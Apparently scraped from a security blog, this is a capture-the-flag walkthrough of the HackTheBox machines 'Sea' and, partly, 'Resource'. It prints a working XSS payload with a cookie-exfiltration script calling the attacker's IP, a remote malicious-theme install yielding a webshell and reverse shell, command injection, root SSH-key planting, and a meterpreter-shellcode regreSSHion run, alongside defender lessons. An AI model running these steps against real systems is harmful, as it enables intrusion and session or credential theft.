*Can you help me identify what type of server is running this web app, based on its directory structure? I suspect it is some kind of CMS, but I don&rsquo;t know: It has directories: data, messages, plugins, themes. There is also &ldquo;index.php&rdquo;, &ldquo;contact.php&rdquo;, &ldquo;home&rdquo;, &ldquo;404&rdquo;, and &ldquo;0&rdquo;. Tell me the five most likely types of CMS that could be running this web app&quot;
Although it was much more verbose than this, it listed out the following:
Bludit Grav CMS GetSimple CMS Wolf CMS WonderCMS They pretty much all share the same characteristic directories. Unlike the others, Bludit uses a messages directory, making it the most likely CMS.
However, since the logo image is clearly part of the theme, I did some searching for that one filename. I simply googled &ldquo;&ldquo;bike/img/velik71-new-logotip.png&rdquo; and found a very sparse, but very informative result!
That page shows a discussion between the theme developer and WonderCMS for having the theme integrated into the downloadable / official themes for the CMS. While the WonderCMS them github repo is now deprecated, the theme developer still has it on their github.
I downloaded the theme, and it&rsquo;s definitely a match! This definitively shows that the site is using WonderCMS.
FOOTHOLD Cross-site Scripting As I noted earlier during the script scan, the HttpOnly property of the cookie was set to false. This means that the cookie could be obtained by XSS. Here&rsquo;s what the cookie looks like:
There are a few important things to observe:
the Domain is set to sea.htb the HostOnly property is true, so subdomains of sea.htb would not be able to access it. the HttpOnly property is false, so the cookie is accessible to javascript This is a PHP session ID - if we can get a copy of the target&rsquo;s cookie, we may be able to impersonate them We don&rsquo;t get any output from the form, and have no way of viewing the stored form submission, so a successful attack would have to be blind XSS.
Although I thought I was unlikely to find any result, I checked searchsploit to see if WonderCMS had any known XSS opportunities. Much to my surprise, it does:
It&rsquo;s already on my kali system, so I copied the path, and looked up the exploit on ExploitDB:
searchsploit --path 51805 cp [PASTE] ./exploit/ I won&rsquo;t copy out the whole exploit here, but the gist of it is as follows:
XSS the admin user to steal their session cookie Impersonate their session by navigating to the WonderCMS loginURL Install a module onto the site (as a &ldquo;theme&rdquo; file), which is actually a reverse shell Contact the reverse shell, providing the reverse shell listener&rsquo;s address and port as URL parameters. &#x261d;&#xfe0f; The exploit does all these steps automatically, but I&rsquo;d rather break it down into its component steps and try them manually.
&#x2753; At this point, I checked to see if the reverse shell was already present. Very surprisingly, it was sitting there, named exactly as it is in the Exploit DB script.
To access it, just set up a reverse shell listener and GET the reverse shell script: http://sea.htb/themes/revshell-main/rev.php?lhost=IP&amp;lport=PORT
I reset the box, and the reverse shell was still there. It seems like this box comes pre-exploited &#x1f640;
Was this intentional? Was it sloppiness? I have no idea. I&rsquo;m going to continue this section of the walkthrough by pretending I never found this reverse shell. If you want to skip all this, just go straight to the next section.
If you run the exploit script, it will provide you with a string to use for XSS. For me, it became this:
http://sea.htb/index.php?page=loginURL?&#34;&gt;&lt;/form&gt;&lt;script+src=&#34;http://10.10.14.104:8000/xss.js&#34;&gt;&lt;/script&gt;&lt;form+action=&#34; When the admin user &ldquo;clicks the link&rdquo;, http://10.10.14.104:8000/xss.js should be loaded into the local javascript context and executed. To steal the PHPSESSID, we just need to dump their cookies. For that task, I used my usual XSS exfil script (this becomes my version of xss.js, replacing the need for the one generated by the exploit):
function urlSafeBase64Encode(data) { var encoded = btoa(data) .replace(/\\+/g, &#39;-&#39;) .replace(/\\//g, &#39;_&#39;) .replace(/=/g, &#39;&#39;); return encoded; } new Image().src=&#39;http://10.10.14.104:8000/XSS/?b64=&#39;+urlSafeBase64Encode(document.cookie) (All it does is base64-encode the cookie, then POST it back to my webserver.)
I typically base64-encode everything I exfil via XSS. The http server I use is my variant of the python http.server, which will automatically decode anything passed to it with a b64 parameter.
Please go ahead and try that server if you want to skip a few steps.
Before I try the XSS, I&rsquo;ll start up a webserver in the directory where I have xss.js:
cd www # contains xss.js simple-server 8000 -v Now, I&rsquo;ll try out this XSS by using just the website field on the contact.php form:
After a minute or two, I started seeing responses come in:
&#x1f44f; And there&rsquo;s the session cookie!
I&rsquo;ll copy that into my own browser, and visit the login page. Hopefully it will recognize the session cookie and just redirect me:
http://sea.htb/loginURL &#x1f601; Bingo! It worked perfectly. This is the admin interface to WonderCMS.
Shoot&hellip; I actually really like this. WonderCMS seems far, far better than Wordpress.
The Site Configuration panel shows several promising options for us to gain RCE:
Files seems like the obvious choice. Just upload a webshell or something, right? Well, it doesn&rsquo;t agree:
But clearly there is a way to add new PHP to the website - otherwise this would be a pretty useless CMS, right? Both Themes and Plugins would perform that task. Let&rsquo;s do exactly as shown in EDB-ID 51805 and install malicious theme/plugin using the API-style call. The request should look like this:
GET http://sea.htb/?installModule=http://10.10.14.104:8000/myplugin.zip&amp;directoryName=violet&amp;type=themes&amp;token=[TOKEN] Generating the plugin It&rsquo;s just going to be a webshell inside a zip. From the WonderCMS documentation, it seem that it&rsquo;s important that the name of the directory inside the zip matches the module name:
mkdir -p exploit/myplugin cp /usr/share/webshells/php/phpbash.php exploit/myplugin/lkjhgytrscbuni6656754756.php cd exploit zip -r myplugin.zip myplugin Then make sure we can obtain this zip via the local webserver:
cd ../www cp ../exploit/myplugin.zip ./ sudo ufw allow from $RADDR to any port 8000 proto tcp simple-server 8000 -v # serve this directory, if it isnt already served Uploading the plugin Now we just need to obtain a token. We can do this by simply searching the DOM of the admin interface. I found it in the Logout button:
&lt;a href=&#34;http://sea.htb/logout?token=43f2388fdb232fc04313fe47a0d0b8a71f37887c5c59a37b7324a1110953373a&amp;amp;to=home/&#34; class=&#34;wbtn wbtn-danger wbtn-sm button logout&#34; title=&#34;Logout&#34; onclick=&#34;return confirm(&#39;Log out?&#39;)&#34;&gt;&lt;i class=&#34;logoutIcon&#34;&gt;&lt;/i&gt;&lt;/a&gt; Finally, let&rsquo;s wrap it all together by sending the request to the installModule endpoint:
&#x1f447; Remember to include the PHPSESSID cookie, otherwise it wont match the token we&rsquo;ve provided
TOKEN=&#39;43f2388fdb232fc04313fe47a0d0b8a71f37887c5c59a37b7324a1110953373a&#39; MODULE=&#39;http://10.10.14.104:8000/myplugin.zip&#39; COOKIE=&#39;PHPSESSID=j4sbrq5ufqc187s1q990tfmu24&#39; curl &#34;http://sea.htb/?installModule=$MODULE&amp;directoryName=violet&amp;type=themes&amp;token=$TOKEN&#34; -b $COOKIE Webshell Now we can check to see if our &ldquo;module&rdquo; was actually installed. Just navigate to http://sea.htb/themes/myplugin/lkjhgytrscbuni6656754756.php
&#x1f917; I gave the webshell a really obscure name so that people couldn&rsquo;t discover it via fuzzing.
&#x1f389; There we go! We have RCE &#x1f601;
Webshell into Reverse shell Let&rsquo;s prepare a reverse shell listener:
&#x1f4a1; I&rsquo;m trying to get into the habit of using stealthier ports
sudo ufw allow from $RADDR to any port 53 proto tcp bash sudo nc -lvnp 53 No need to overcomplicate anything, we can use a simple nc reverse shell. Be sure to background the process with a &amp; or it will cause the whole webserver to hang.
Checking our reverse shell listener, we see that it worked perfectly &#x1f609;
Foothold was harder than I thought it would be, but actually pretty cool!
USER FLAG Upgrade the shell It would be good to have a nicer shell. Let&rsquo;s upgrade this one:
which python python3 perl bash # Python3 is present python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;) [Ctrl+Z] stty raw -echo; fg [Enter] [Enter] export TERM=xterm-256color export SHELL=bash stty rows 35 columns 120 alias ll=&#34;ls -lah&#34; Local Enumeration - www-data Checking out the /var/www/sea directory, I almost immediately found database.js. Inside, we clearly see the WonderCMS admin password hash:
It&rsquo;s tempting to just toss this into john or hashcat, but this will result in an error:
We need to remember that this was a javascript file: the string we took out of it actually contains backslash \\ escapes. Edit the hash and remove them:
Running it through john again, we get the password within seconds:
These are the users on the box that we care about. If I&rsquo;m checking for credential re-use, these are the top prospects:
cat /etc/passwd | grep -v nologin | grep -v /bin/false | grep -vE &#39;^sync:&#39; # root:x:0:0:root:/root:/bin/bash # amay:x:1000:1000:amay:/home/amay:/bin/bash # geo:x:1001:1001::/home/geo:/bin/bash I&rsquo;ll try SSH as either of the users with a home directory:
ssh geo@$RADDR # use password &#34;mychemicalromance&#34; # Nope ssh amay@$RADDR # use password &#34;mychemicalromance&#34; # Yep! &#x1f389; Alright! Success. The SSH connection drops us into /home/amay, adjacent to the user flag. Simply cat it out for the points:
cat user.txt ROOT FLAG Local Enumeration - amay Checking sudo -l shows that amay doesn&rsquo;t actually have any sudo access. However, we can see right away that there are some services listening locally:
&#x261d;&#xfe0f; Usually I&rsquo;d just establish a SOCKS5 proxy using chisel. However, this box is giving me the dreaded &ldquo;No space left on device&rdquo; &#x1f631;
Thankfully, we have SSH credentials, so we can just forward the ports instead! (Note I&rsquo;ll use 8008 instead of 8080, because I already have ZAP using port 8080)
exit # log out of amay ssh -L 8008:localhost:8080 -L 52119:localhost:52119 amay@$RADDR Now we can check out what is running on port 8080.
When I navigate to http://localhost:8008 I&rsquo;m presented with http basic authentication prompt. Assuming that amay has access to this service, I just used those credentials (amay : mychemicalromance):
The authentication was successful, and brings us to some kind of system monitor page:
System Monitor This page appears to let us do some basic administrative tasks on the host. Normally, all of these operations require root access, so this may be useful for privilege escalation&hellip; &#x1f914;
The bottom section is particularly interesting. It allows us to read either /var/log/apache2/access.log or /var/log/auth.log, both of which can only be read by root (or members of the adm group):
When we click the button to analyze access.log, we get some output based on the file contents. The same is true for auth.log:
If we proxy this request through ZAP, we can see that the filename is passed via a POST body:
POST http://localhost:8080/ HTTP/1.1 host: localhost:8080 ... Content-Type: application/x-www-form-urlencoded ... log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&amp;analyze_log= Additionally, it seems like the two filenames are hardcoded directly into the dropdown menu:
From a coding perspective, this is a really odd choice. It&rsquo;s either a mistake or a vulnerability. Let&rsquo;s test if the value of the &lt;option&gt; element determines which file is read by the tool:
&#x1f602; I&rsquo;d say this is pretty clear confirmation:
However, if we try to read /root/root.txt by the same method, we just get a message stating &ldquo;No suspicious traffic patterns detected in /root/root.txt.&rdquo;
This means that the underlying system must be running grep over the specified file, or something similar, and if any result was returned then it will show us the file contents. Since there is nothing suspicious about the hash inside of /root/root.txt, we can&rsquo;t see the contents directly.
We can imagine that behind-the-scenes, there is a command like this running:
$(cat $FILENAME | grep -f suspicious_traffic_patterns.txt) &amp;&amp; echo &#34;Suspicious traffic patterns detected in $FILENAME&#34; || echo &#34;No suspicious traffic patterns detected in $FILENAME&#34; So&hellip; Why not just redirect the output of the cat part? &#x1f609;
When we run the Analyze operation, we see the file created at /tmp/.Tools/logfile:
If all you want is the flag, that&rsquo;s it!
EXTRA CREDIT Full Pwn Why stop with an arbitrary file read? We&rsquo;ve already demontrated that we can also write an arbitrary file, so let&rsquo;s write something useful - we could plant an ssh key onto the root user and have full access to the box.
First, from the attacker host, create a new keypair:
ssh-keygen -t rsa -b 4096 -f root_id_rsa -N &#39;vulture.1337&#39; chmod 600 root_id_rsa base64 -w 0 root_id_rsa.pub # Copy to clipboard Now, using the amay ssh connection, insert pubkey into a file on the target:
echo -n &#39;[PASTE CLIPBOARD]&#39; | base64 -d &gt; /tmp/.Tools/id_rsa.pub With the pubkey in place, we can now just append it into /root/.ssh/authorized_keys:
&#x261d;&#xfe0f; Be sure to use &gt;&gt; instead of &gt; for this. Then you won&rsquo;t ruin anybody else&rsquo;s root backdoor.
We can now use our private key to log into the box as root:
ssh -i root_id_rsa root@$RADDR # use passphrase &#39;vulture.1337&#39; System Monitor The two directories inside /root pertain to the System Monitor service we just used for privesc. Out of interest, we can now see exactly the script we injected our input into, in /root/monitoring/index.php:
if (isset($_POST[&#39;analyze_log&#39;])) { $log_file = $_POST[&#39;log_file&#39;]; $suspicious_traffic = system(&#34;cat $log_file | grep -i &#39;sql\\|exec\\|wget\\|curl\\|whoami\\|system\\|shell_exec\\|ls\\|dir&#39;&#34;); if (!empty($suspicious_traffic)) { echo &#34;&lt;p class=&#39;error&#39;&gt;Suspicious traffic patterns detected in $log_file:&lt;/p&gt;&#34;; echo &#34;&lt;pre&gt;$suspicious_traffic&lt;/pre&gt;&#34;; } else { echo &#34;&lt;p&gt;No suspicious traffic patterns detected in $log_file.&lt;/p&gt;&#34;; } } Wow! The system() call we exploited was even simpler than I had imagined &#x1f602;
cat $log_file | grep -i &#39;sql\\|exec\\|wget\\|curl\\|whoami\\|system\\|shell_exec\\|ls\\|dir&#39; Contact.php XSS Now that I have a root shell, I can freely check out what the point of geo was.
As it turns out, they hold the script that performs the contact form checking! It&rsquo;s at /home/geo/scripts/contact.py:
import os import asyncio from pyppeteer import launch import requests async def XSS(page, url): login_url = &#39;http://127.0.0.1/loginURL&#39; headers = {&#39;host&#39;: &#39;sea.htb&#39;} data = {&#39;password&#39;: &#39;mychemicalromance&#39;} response = requests.post(login_url, data=data, headers=headers, allow_redirects=False) cookie = response.headers.get(&#39;Set-Cookie&#39;) cookie = cookie.split(&#39;;&#39;) cookie = cookie[1].split(&#39;=&#39;)[2] cookie = {&#39;name&#39;: &#39;PHPSESSID&#39;, &#39;value&#39;: cookie, &#39;domain&#39;: &#39;sea.htb&#39;} await page.setCookie(cookie) try: await page.goto(url) content = await page.content() except Exception as e: print(f&#34;[!] Failed at goto. {e}&#34;) async def main(): browser = await launch(headless=True, args=[&#39;--no-sandbox&#39;]) page = await browser.newPage() directory_path = &#34;/var/www/sea/messages/&#34; while True: files = os.listdir(directory_path) message_files = [file for file in files if file.endswith(&#34;.txt&#34;)] urls = [] for file in message_files: try: file_path = os.path.join(directory_path, file) with open(file_path, &#39;r&#39;) as f: lines = f.readlines() for line in lines: if line.startswith(&#34;Website:&#34;): website = line.strip().split(&#34;: &#34;)[1] urls.append(website) except: print(f&#34;[!] Failed to process {file}&#34;) for url in urls: try: await XSS(page, url) except: print(&#34;[!] Failed at XSS&#34;) os.system(f&#34;rm -f {directory_path}*&#34;) await asyncio.sleep(60) asyncio.get_event_loop().run_until_complete(main()) In short, the XSS happens implicitly, right here:
try: await page.goto(url) content = await page.content() except Exception as e: print(f&#34;[!] Failed at goto. {e}&#34;) CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools:
rm -rf /tmp/.Tools Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf loot sudo vim /etc/hosts # Remove sea.htb It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f6aa; Check if the box has already been exploited. When you&rsquo;re up against a seriously misconfigured target, or one that&rsquo;s vulnerable to a very well-known exploit, there is a good chance that the box has already been exploited. It&rsquo;s useful to check quickly if you can access any backdoors that may have been installed already. The best hackers will close every door behind themselves, and cover all of their own tracks, but there are plenty of sloppy hackers out there too. It&rsquo;s greasy, but if all you want is the points, then go for it.
&#x1f501; Figure out your own exploit. Opposite to the previous point, you will learn so much more by creating your own exploit. Even if this only involves re-writing each component step of an existing exploit then delivering it from your own infrastructure, the learning is very valuable. After all, not everyone who develops an exploit is some ultra-elite pro hacker with a decade of experience&hellip; sometimes the vulnerability is easy, and that developer was simply the first to publish something!
&#x2611;&#xfe0f; Use a checklist with recon. Not everyone would have taken the extra step to identify the CMS on this box. In this case, identifying the CMS was essential to the exploit. It&rsquo;s smart to establish a checklist for recon, so you can spend a few minutes on each item and build a bigger picture of what the target is about. Even if you had, for example, a checklist item saying &ldquo;identify CMS&rdquo; but the target was running some custom-made website without a CMS, at least you spent a few minutes and can confidently write down &ldquo;no result found&rdquo; next to that box.
Defender &#x1f36a; Protect against XSS. It&rsquo;s usually pretty easy to protect against XSS. On this box, the attacker would have been thwarted by applying a proper CSP header, and setting the cookie HttpOnly attribute to True and SameSite to True. Some other really useful mitigations would have been input sanitization on the website field of contact.php. After all, there was no reason that we should have allowed any characters that aren&rsquo;t used in URLs. Although it&rsquo;s clearly outside the scope of this box, the site should also have used HTTPS, and used the Secure cookie attribute.
&#x1f476; Least privilege, yep still important!. On this box, there was an internal System Monitor web app running as root. That&rsquo;s a really bad idea. Why not run it as a system account, and just grant access to the log files? The system account (ex. systemmonitor) could be placed in the sudoers list with the ability to do the apt stuff:
systemmonitor ALL=(ALL) NOPASSWD: /usr/bin/apt update, /usr/bin/apt clean `,url:"https://4wayhandshake.github.io/walkthrough/sea/"},"https://4wayhandshake.github.io/walkthrough/resource/":{title:"Resource",tags:["Phar Deserialization","PHP Wrapper","File Upload Vulnerability","Certificate Management","Key Signing","File Read Bruteforcing"],categories:["Walkthrough","HTB","Linux","Hard"],content:`INTRODUCTION Resource was released as first box of HTB&rsquo;s Season 6, Heist. The box was created by the famous user, 0xdf - and it doesn&rsquo;t disappoint! This box establishes a whole fictional company and a narrative of the scenario, to a degree that is rare among HTB boxes. We find ourselves attacking an IT service company that is going through a period of their certificate and key management. The box is full of rabbit-holes and distractions, making it slightly frustrating but definitely a more realistic simulation than many other HTB boxes. Although the steps in Resource tend to be short, they are numerous: by my count, I had to do five pivots between separate users to complete this box.
Aside from the distractions, recon is pretty easy on Resource. After finding the subdomain to attack, some simple directory/file enumeration will give you a rough map of the web app. A little exploration of the web app uncovers an unconventional file upload vulnerability involving deserialization. Exploitation of this vulnerability leads straight to a foothold.
Achieving the user flag requires a little bit of enumeration skill. The details we need to find won&rsquo;t be found by many of the popular auto-enumeration tools, and may require a bit of homebrew scripting. While it&rsquo;s technically unnecessary, accessing the database while seeking the user flag will add a lot of narrative context to the box, ultimately making the sprint for the root flag much more sensible.
Privilege escalation to the root flag was, at least in my opinion, a lot of fun. Very little enumeration is required, but a thorough understanding of the IT context will vastly improve planning efforts for privilege escalation. Here, we need to utilize a flawed system for signing SSH keys (from an internal/trusted CA certificate), but without actually having access to that CA cert - get ready to be a little creative!
Thanks 0xdf, this box was a lot of fun! I hope the stability issues on this box get fixed, because that was the only downside.
&#x270f;&#xfe0f; Edit: When I went to publish this walkthrough, I noticed that the rating had been changed to Hard. It was originally Medium.
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 2222/tcp open EtherNetIP-1 Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0) | ssh-hostkey: | 256 d5:4f:62:39:7b:d2:22:f0:a8:8a:d9:90:35:60:56:88 (ECDSA) |_ 256 fb:67:b0:60:52:f2:12:7e:6c:13:fb:75:f2:bb:1a:ca (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://itrc.ssg.htb/ 2222/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f2:a6:83:b9:90:6b:6c:54:32:22:ec:af:17:04:bd:16 (ECDSA) |_ 256 0c:c3:9c:10:f5:7f:d3:e4:a8:28:6a:51:ad:1a:e1:bf (ED25519) That&rsquo;s interesting - they&rsquo;re running two versions of SSH, one older than the other. Also notable is the HTTP redirect to http://itrc.ssg.htb
Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No results.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 68/udp open|filtered tcpwrapped 139/udp open|filtered tcpwrapped 996/udp open|filtered tcpwrapped 1030/udp open|filtered iad1 2223/udp open|filtered tcpwrapped 30718/udp open|filtered tcpwrapped 49200/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Vulnerability Research Since all we can see are two open ports running two different versions of OpenSSH, it&rsquo;s worth checking if the foothold lies in one of them. Normally I don&rsquo;t investigate ways to attack SSH itself, but since there conspiculously two versions, it might yield a result this time.
As per the version shown in the script scan, I searched for &ldquo;openssh 8.9p1 ubuntu 3ubuntu0.10 vulnerabilities&rdquo; and immediately realized that this version of OpenSSH has a (fairly) famous vulnerability called RegreSSHion. More details can be found in this article from Qualys. It affects OpenSSH 8.5p1+.
&ldquo;regreSSHion, CVE-2024-6387, is an unauthenticated remote code execution in OpenSSH’s server (sshd) that grants full root access. It affects the default configuration and does not require user interaction. It poses a significant exploit risk.&rdquo;
Wow, that&rsquo;s nuts! As expected, there are plenty of PoCs available. This one by l0n3m4n looks to be of particularly high quality, so I&rsquo;ll try it out.
git clone https://github.com/l0n3m4n/CVE-2024-6387.git cd CVE-2024-6387 # Generate some shellcode for a reverse shell, in C format msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.4 LPORT=53 -f c # Prepare to catch a reverse shell sudo ufw allow from $RADDR to any port 53 proto tcp bash socat -d TCP-LISTEN:53 STDOUT Now we need to insert the shellcode into 7etsuo-regreSSHion.c and compile it into exploit.so:
gcc -shared -o exploit.so -fPIC 7etsuo-regreSSHion.c As indicated in the python script, we need to uncomment a few lines at the beginning:
Now we&rsquo;re good to go - run the exploit:
python3 CVE-2024-6387.py --exploit $RADDR --port 2222 If I understand correctly, this exploit utilizes a race condition with the timeout event of the authentication process, so it&rsquo;s probably going to take a loooong time to run. I&rsquo;ll leave it running for a bit, while I investigate other things.
Webserver Strategy Noting the redirect from the nmap scan, I added itrc.ssg.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=itrc.ssg.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb --aggression 3 http://$DOMAIN &amp;&amp; curl -IL http://$RADDR Nothing too strange there. The PHP version seems to be a few months old, but nothing crazy.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No result. Now I&rsquo;ll check for other subdomains of ssg.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.ssg.htb&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Still nothing&hellip; I&rsquo;ll check for other subdomains of itrc.ssg.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.itrc.ssg.htb&#34; -c -t 60 -o fuzzing/vhost-itrc.ssg.md -of md -timeout 4 -ic -ac -v Nope - nothing from that either. I&rsquo;ll move on to directory enumeration on http://itrc.ssg.htb:
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e .php,.js,.html,.txt -timeout 4 Directory enumeration against http://itrc.ssg.htb gave the following:
Unsurprisingly, these pages match up with the querystring inside the URI of all locations in the web app, for example, this one loads dashboard.php:
Could there be an LFI here? Not sure yet, but let&rsquo;s try the other pages. Most of the pages are available through regular navigation around the site. Some are clearly code-only PHP documents with no frontend. One notable exception to both of these is admin.php:
Exploring the Website Login as admin I&rsquo;ll try some quick credential-guessing at the login page, just to make sure I&rsquo;m not overlooking something really obvious:
ffuf -u http://itrc.ssg.htb/api/login.php -r -t 16 -c -v \\ -w &#34;/usr/share/seclists/Usernames/top-usernames-shortlist.txt:USER&#34; \\ -w &#34;/usr/share/seclists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt:PASS&#34; \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -d &#39;user=USER&amp;pass=PASS&#39; \\ -fr &#39;Login&#39; No result from that.
From the admin.php page, we see something saying to &ldquo;Contact zzinter for manual provisioning&rdquo; - perhaps that&rsquo;s a username?
ffuf -u http://itrc.ssg.htb/api/login.php -r -t 16 -c -v \\ -w &#34;/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt:PASS&#34; \\ -H &#34;Content-Type: application/x-www-form-urlencoded&#34; \\ -d &#39;user=zzinter&amp;pass=PASS&#39; \\ -fr &#39;Login&#39; Ticket ID - IDOR From the image above, we can see that the Ticket ID is plainly visible. Unfortunately, we can&rsquo;t easily utilize this as an IDOR - attempting to load tickets (such as using the URL http://itrc.ssg.htb/?page=ticket&amp;id=3) result in a toast &ldquo;Unable to retieve ticket&rdquo;:
FOOTHOLD Ticket Submission File Upload As shown in the previous image, I took some time to play around with defining a new ticket. The form is simple, but there might be a few interesting options:
There are three inputs available to us here: the subject, the issue, and the attachment. Indirectly, we can also affect the Ticket ID. I&rsquo;ll make a bogus zip file that contains a PHP webshell, just for sake of testing:
mkdir test cp ~/Tools/STAGING/webshell.php ./test/test.php zip -r test.zip test Uploading this zip and viewing the ticket again, we see a link to the uploaded zip:
&#x1f914; The format of that filename looks familiar. It&rsquo;s not in UUID format, as we might expect it to be. Is it a hash?
for algo in 1 224 256 384 512 512224 512256; do echo -e &#34;\\nTesting SHA-$algo&#34;; shasum -a $algo test.zip; done Suspicion confirmed - it is a SHA-1 hash!
Why does that matter? Well, aside from mechanisms like allow-listing various file extensions or MIME types, renaming an uploaded file is a pretty good way to thwart file upload attacks. Next, I&rsquo;ll investigate what other protections are in place.
Checking upload restrictions Let&rsquo;s check what happens when submitting alternative file extensions. We already know .zip works. I&rsquo;ll start with this wordlist of PHP extensions, and attach it to a zip extension in a few ways.
#!/bin/bash OUTFILE=php_zip_extensions.lst PHP_EXTENSIONS=extensions.lst EXT=&#39;.zip&#39; echo &#34;$EXT&#34; &gt;&gt; $OUTFILE; while read -r PHP; do echo &#34;$PHP&#34; &gt;&gt; $OUTFILE; echo &#34;$EXT$PHP&#34; &gt;&gt; $OUTFILE; echo &#34;$PHP$EXT&#34; &gt;&gt; $OUTFILE; for CHAR in &#39;%20&#39; &#39;%0a&#39; &#39;%00&#39; &#39;%0d0a&#39; &#39;/&#39; &#39;.\\\\&#39; &#39;.&#39; &#39;…&#39; &#39;:&#39;; do echo &#34;$PHP$CHAR$EXT&#34; &gt;&gt; $OUTFILE; done; done &lt; $PHP_EXTENSIONS; cat $OUTFILE | sort -u &gt; &#34;$OUTFILE.tmp&#34; mv &#34;$OUTFILE.tmp&#34; $OUTFILE echo &#34;Wrote wordlist to: $OUTFILE&#34; I ran that, then used the resulting wordlist with ffuf:
WLIST=php_zip_extensions.lst ffuf -w $WLIST -request comment_file_upload.raw -c -t 60 -timeout 4 -ic -fs 0 Plenty of file extensions worked properly. Specifically, all of the ones that ended with .zip worked:
The results were visible on the Comments section of the test Ticket that I created. Unfortunately though, the filename always ends with .zip, regardless of what extension the file was created with:
This means that a malicious file upload will not be possible.
File Inclusion We already saw from earlier that it is possible to use a URI like http://itrc.ssg.htb/?page=PAGENAME to load a certain PHP file from the server. Sometimes, servers written to load pages in this way can be tricked into loading other resources.
Local File Inclusion To check for an LFI, I&rsquo;ll specifically search for /etc/passwd. I&rsquo;ll check a variety of path traversals by using one of my own tools, Alfie.
The intended workflow is to use filter mode, then scan mode, then enumerate mode. Each mode leads into the next one.
# Try to find sensible filters to apply python3 alfie.py -u &#39;http://itrc.ssg.htb/?page=&#39; -b &#34;PHPSESSID=81043be7d4a8631317e539931112cb6b&#34; filter # Try scanning for different ways that /etc/passwd can be accessed python3 alfie.py -u &#39;http://itrc.ssg.htb/?page=&#39; -b &#34;PHPSESSID=81043be7d4a8631317e539931112cb6b&#34; -fs &#39;3956-3997&#39; -fw &#39;191&#39; scan No result - This means that Alfie wasn&rsquo;t able to access /etc/passwd using any known traversal.
I also tried accessing the known PHP files using filters, as this can be useful for obtaining the source code. However, none of these tests were successful:
http://itrc.ssg.htb/?page=php://filter/read=convert.base64-encode/resource=dashboard http://itrc.ssg.htb/?page=php://filter/read=convert.base64-encode/resource=dashboard.php http://itrc.ssg.htb/?page=php://filter/read=convert.base64-encode/resource=./dashboard.php http://itrc.ssg.htb/?page=php://filter/read=convert.base64-encode/resource=file:///etc/passwd PHP Wrappers The php://fd wrapper can be useful. If you get really lucky, it can divulge environment variables. I checked for it using a simple ZAP Fuzz to check for all file descriptors between 0 and 999:
No luck with php://fd.
Two wrappers that are useful for gaining RCE are expect:// and php://input. While it didn&rsquo;t actually lead to RCE, the expect:// wrapper was actually useful - by causing an error, it disclosed what the webserver root directory is and that the funciton file_exists() is being used!
What about php://input? It&rsquo;s used by passing PHP code into the body of the request:
curl -X POST -b &#39;PHPSESSID=81043be7d4a8631317e539931112cb6b&#39; --data &#34;&lt;?php phpinfo(); ?&gt;&#34; &#39;http://itrc.ssg.htb/?page=php://input&#39; Nope, no result from that either (all of these negative results just lead to the default dashboard page).
